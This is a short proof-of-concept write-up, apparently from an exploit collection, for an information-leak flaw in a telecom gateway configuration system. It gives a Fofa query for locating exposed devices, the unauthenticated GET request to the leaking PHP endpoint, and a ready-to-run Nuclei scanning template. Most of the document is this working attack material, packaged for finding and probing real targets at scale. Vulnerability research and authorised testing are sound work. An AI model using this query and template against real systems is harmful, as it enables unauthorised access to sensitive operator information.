### Telecom Gateway Configuration Management System Unauthorized Access to Sensitive Information

**Fofa Query:** `body="img/dl.gif" && title="系统登录"`

**Vulnerability Description:** The telecom gateway configuration system is vulnerable to information leakage, allowing unauthorized access to sensitive information.

**Vulnerability POC (Proof of Concept):**

1. **Send a GET request to the following URL:**

   ```
   GET /newlive/manager/infomation.php HTTP/1.1
   ```

   **Response Code Characteristic:** 200  
   **Response Content Characteristic:** Contains "Cpu"

2. **Nuclei POC:**

   ```yaml
   id: Telecom-Gateway-InfoLeak
   
   info:
     name: Telecom Gateway Configuration System Information Leakage
     author: Expert
     severity: high
     metadata:
       fofa-query: body="img/dl.gif" && title="系统登录"
   http:
     - raw:
         - |
           GET /newlive/manager/infomation.php HTTP/1.1
           Host: {{Hostname}}
           User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
       matchers:
         - type: dsl
           dsl:
             - status_code==200 && contains(body, "Cpu")
   ```

